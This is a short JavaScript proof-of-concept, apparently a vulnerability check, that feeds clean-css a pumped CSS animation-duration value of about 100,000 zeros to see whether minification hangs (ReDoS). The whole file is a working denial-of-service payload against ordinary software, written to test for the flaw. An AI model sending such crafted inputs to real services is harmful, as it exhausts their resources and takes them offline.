'use strict';
const CleanCSS = require('clean-css');

// Copy and paste the unit test locally and make sure if the current version is vulnerable.
var prefix = '-+.0';
var pump = [];
var suffix = '-0';
var input;
var i;

for (i = 0; i < 10000; i++) {
    pump.push('0000000000');
}

input = '.block{animation:1s test;animation-duration:' + prefix + pump.join('') + suffix + 's}';

return new CleanCSS({ level: { 1: { replaceZeroUnits: false }, 2: true } }).minify(input);

/*
      'finishes in less than a second': function (error, minified) {
        assert.isTrue(minified.stats.timeSpent < 1000);
      }
*/
// Regarding the above identification, if it takes more than a second, than it has the vulnerability.

const val = new CleanCSS({ level: { 1: { replaceZeroUnits: false }, 2: true } });
// Check if commenting this would suddenly immediately run without waiting.
// Check also from the stack trace.
val.minify(input); 